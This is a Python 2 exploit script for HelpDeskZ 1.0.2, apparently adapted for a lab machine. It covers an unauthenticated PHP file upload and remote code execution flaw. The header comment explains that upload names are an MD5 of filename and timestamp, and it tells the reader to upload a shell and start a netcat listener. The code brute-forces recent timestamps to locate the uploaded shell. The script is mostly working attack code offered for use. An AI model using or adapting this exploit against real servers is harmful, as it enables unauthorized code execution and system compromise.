#!/bin/python
# HelpDeskZ 1.0.2 – Arbitrary File Upload → Remote Code Execution (EDB-ID:40300)
# Version check tip: browse to /README.md
# Based on: https://www.exploit-db.com/raw/40300
# Original exploit had incorrect time calculation
# Reference fix: IppSec video – https://youtu.be/XB8CbhfOczU?t=535

'''
Vulnerability Summary:
HelpDeskZ v1.0.2 suffers from an unauthenticated PHP file upload vulnerability.
In the default configuration, .php files can be uploaded. Developers appear to 
have assumed this was safe because uploaded filenames are obfuscated. However, 
the renaming function is flawed:

File: controllers/submit_ticket_controller.php (line 141)
$filename = md5($_FILES['attachment']['name'] . time()) . ... $ext;

This allows an attacker to guess the upload timestamp and reconstruct the 
obfuscated filename, leading to remote code execution.

Steps to Reproduce:
1. Fill out a ticket form and attach a php file, solve the captcha and upload
- The UI shows "File is not allowed," but the file is still uploaded.
2. Start a netcat listener on your machine.
3. Run this exploit with:
   python exploit.py http://<target>/helpdeskz phpshell.php
   
Impact:
Remote Code Execution (Unauthenticated).
'''

import hashlib
import time, calendar
import sys
import requests

print 'HelpDesk v1.0.2 - Unauthenticated shell upload'

if len(sys.argv) < 3:
    print "Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0])
    sys.exit(1)


helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

#Getting the Time from the server
response = requests.head('http://10.10.10.121/support/')
serverTime = response.headers['Date']
#setting the time in Epoch
FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))


for x in range(0,300):
    plaintext = fileName + str(currentTime -x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl + md5hash + '.php'
    response = requests.head(url)
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")
